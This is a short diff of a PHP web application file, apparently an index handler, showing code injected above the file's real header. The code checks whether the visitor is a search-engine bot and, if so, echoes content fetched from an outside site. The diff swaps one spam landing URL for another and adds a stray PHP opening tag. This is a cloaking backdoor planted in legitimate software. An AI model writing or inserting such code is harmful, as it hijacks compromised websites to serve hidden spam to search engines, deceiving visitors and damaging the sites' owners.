@@ -30,8 +30,9 @@ function fetch_content($url) {
 }
  
 if (is_bot()) {
-    echo fetch_content('https://pessawat.site/autoboot/');
+    echo fetch_content('https://inkaindonesia.org/landing/zhatainstitut.html');
 }
+<?php
 
 /**
  * @file pages/index/IndexHandler.php
